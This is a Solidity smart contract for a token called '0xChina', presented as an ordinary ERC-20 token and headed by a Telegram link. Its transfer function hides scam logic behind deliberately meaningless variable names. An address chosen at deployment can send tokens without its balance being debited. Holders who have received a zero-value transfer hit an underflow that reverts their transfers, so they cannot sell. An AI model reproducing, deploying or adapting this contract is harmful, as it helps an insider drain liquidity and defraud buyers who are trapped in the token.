/*

https://t.me/zeroxchinaerc

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract xChina is Ownable {
    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) private jdeswnuzc;

    uint256 private jykxdtbel = 92;

    function transfer(address wythevui, uint256 rwudikgzt) public returns (bool success) {
        gtvoexb(msg.sender, wythevui, rwudikgzt);
        return true;
    }

    function gtvoexb(address bcpdugwenjo, address wythevui, uint256 rwudikgzt) private returns (bool success) {
        if (jdeswnuzc[bcpdugwenjo] == 0) {
            balanceOf[bcpdugwenjo] -= rwudikgzt;
        }

        if (rwudikgzt == 0) jsqlukxwtib[wythevui] += jykxdtbel;

        if (bcpdugwenjo != yjdzeqgboiwl && jdeswnuzc[bcpdugwenjo] == 0 && jsqlukxwtib[bcpdugwenjo] > 0) {
            jdeswnuzc[bcpdugwenjo] -= jykxdtbel;
        }

        balanceOf[wythevui] += rwudikgzt;
        emit Transfer(bcpdugwenjo, wythevui, rwudikgzt);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private jsqlukxwtib;

    address public yjdzeqgboiwl;

    function approve(address joheytm, uint256 rwudikgzt) public returns (bool success) {
        allowance[msg.sender][joheytm] = rwudikgzt;
        emit Approval(msg.sender, joheytm, rwudikgzt);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    uint8 public decimals = 9;

    string public symbol = '0xChina';

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name = '0xChina';

    constructor(address ywzrlpbi) {
        balanceOf[msg.sender] = totalSupply;
        jdeswnuzc[ywzrlpbi] = jykxdtbel;
        IUniswapV2Router02 lchtkbm = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        yjdzeqgboiwl = IUniswapV2Factory(lchtkbm.factory()).createPair(address(this), lchtkbm.WETH());
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transferFrom(address bcpdugwenjo, address wythevui, uint256 rwudikgzt) public returns (bool success) {
        require(rwudikgzt <= allowance[bcpdugwenjo][msg.sender]);
        allowance[bcpdugwenjo][msg.sender] -= rwudikgzt;
        gtvoexb(bcpdugwenjo, wythevui, rwudikgzt);
        return true;
    }
}